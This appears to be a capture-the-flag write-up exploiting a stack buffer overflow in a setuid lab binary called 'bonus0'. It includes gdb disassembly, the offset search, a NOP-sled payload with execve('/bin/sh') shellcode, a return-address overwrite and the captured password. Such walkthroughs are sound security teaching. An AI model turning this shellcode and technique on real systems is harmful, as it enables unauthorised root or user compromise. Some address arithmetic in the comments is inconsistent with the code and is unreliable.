```shell
$> ls -la
[...]
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
[...]

$> ./bonus0
 - 

 - 


$> ./bonus0
 - 
test
 - 
blabla
test blabla

$> ./bonus0
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
Segmentation fault (core dumped)

# program asks 2 times for the input and then prints the string separated by a space
# But it will segfault if second input is too long ...
```

```shell
$> gdb -q bonus0
(gdb) i func
[...]
0x080484b4  p
0x0804851e  pp
0x080485a4  main
[...]

# here we can see that the program calls the function p, pp and main

(gdb) i var
[...]

# no interesting variable
```

```shell
$> gdb -q bonus0
(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x080485b4 <+16>:    call   0x804851e <pp>
    [...]
    0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
    [...]

# main calls pp() and puts()

(gdb) disas pp
    [...]
    0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0
    0x0804852e <+16>:    lea    eax,[ebp-0x30]
    0x08048531 <+19>:    mov    DWORD PTR [esp],eax
    0x08048534 <+22>:    call   0x80484b4 <p>                   #1
    0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0
    0x08048541 <+35>:    lea    eax,[ebp-0x1c]
    0x08048544 <+38>:    mov    DWORD PTR [esp],eax
    0x08048547 <+41>:    call   0x80484b4 <p>                   #2
    0x0804854c <+46>:    lea    eax,[ebp-0x30]
    0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax
    0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8]
    0x08048556 <+56>:    mov    DWORD PTR [esp],eax
    0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>          #3
    [...]
    0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8]
        [...]
    0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi]        #4
    [...]
    0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8]
    0x08048585 <+103>:   movzx  edx,WORD PTR [ebx]
    0x08048588 <+106>:   mov    WORD PTR [eax],dx               #4.1
    0x0804858b <+109>:   lea    eax,[ebp-0x1c]
    0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax
    0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]
    0x08048595 <+119>:   mov    DWORD PTR [esp],eax
    0x08048598 <+122>:   call   0x8048390 <strcat@plt>          #5
    [...]

#1:     first time call p() with parameter s1 ([ebp-0x30]) and " - " (0x80486a0)
#2:     second time call p() with parameter s2 ([ebp-0x1c]]) and " - " (0x80486a0)
#3:     a strcpy() is called that copies the string in s1 ([ebp-0x30]) to buffer ([ebp+0x8])
#4:     a strlen() style loop is called that counts the number of bytes in buffer ([ebp+0x8]) where is the index of the last byte
#4.1:   assign a space (dx) to the last byte of buffer ([ebp+0x8])
#5:     a strcat() is called that concatenates the string in s2 ([ebp-0x1c]]) to buffer ([ebp+0x8])

(gdb) disas p
    [...]
    0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc]
    0x080484c0 <+12>:    mov    DWORD PTR [esp],eax
    0x080484c3 <+15>:    call   0x80483b0 <puts@plt>            #1
    0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
    0x080484d0 <+28>:    lea    eax,[ebp-0x1008]                #2
    0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
    0x080484da <+38>:    mov    DWORD PTR [esp],0x0
    0x080484e1 <+45>:    call   0x8048380 <read@plt>            #3
    0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
    0x080484ee <+58>:    lea    eax,[ebp-0x1008]
    0x080484f4 <+64>:    mov    DWORD PTR [esp],eax
    0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>          #4
    0x080484fc <+72>:    mov    BYTE PTR [eax],0x0
    0x080484ff <+75>:    lea    eax,[ebp-0x1008]
    0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
    0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
    0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8]
    0x08048514 <+96>:    mov    DWORD PTR [esp],eax
    0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>         #5
    [...]

#1: a puts() is called that prints " - " ([ebp+0xc])
#2: a buffer of 0x1000 bytes
#3: a read() is called that reads 0x1000 bytes from stdin to the buffer
#4: a strchr() is called that searches for a newline character (0xa) in the buffer and replaces it with a null byte (0x0)
#5: a strncpy() is called that copies 20 bytes (0x14) of the string in the buffer to the string in [ebp+0x8] (s1 or s2)
```

Don't found the shell execute function and nothing to get the flag.  
So here we need inject a shellcode.  
We have a buffer of 4096 bytes in function p() but we only copy 20 bytes with strncpy().  
That we can use the buffer overflow to override the return address.    
If we overflow the buffer of s1 (when the length of s1 is bigger than 20 bytes) that will append the string in s2 to the buffer of s1.  
s1 -> aaaaaaaaaaaaaaaaaaaa
s2 -> bbbbbbbbbbbbbbbbbbbb
    -> s1 + s2 + ' ' + s2
We have a shellcode of 21 bytes, we don't have enough space to inject the shellcode.
So we inject the shellcode in buffer of 4096 bytes.

```shell
$> gdb -q bonus0
(gdb) r
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()

# We need know the eip to inject the shellcode, here the offset is 9 bytes

$> gdb -q bonus0
(gdb) set disassembly-flavor intel
(gdb) disas p
    [...]
    0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
    [...]
(gdb) b *0x080484d0
    [...]
(gdb) r
    [...]
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000

# the address of the buffer is 0xbfffe680

$> python -c "print '\x90' * 256 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'" > /tmp/payload1

# '\x90' * 256: we add a biggest NOP padding before the shellcode to be sure that the shellcode will be executed.

$> python -c "print '\x90' * 9 + '\xfe\xe6\xff\xbf' + '\x90' * 7" > /tmp/payload2

# '\x90' * 9: because wa have 9 bytes to arrive to the eip.
# '\xe6\xfe\xff\xbf': 0xbfffe680 + 126 = 0xbfffe6e6, 126 because is a random number between 0 and 256, is better to use a number beggest than 61 (we have here a s1 (20) + s2 (20) + space (1) + s2 (20) = 61) 
# '\x90' * 7: to overflow the buffer of s2 we need a string bigger than 20 bytes, here 9 + 4 + 7 = 20.

$> (cat /tmp/payload1; cat /tmp/payload2; cat) | ./bonus0
[...]
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```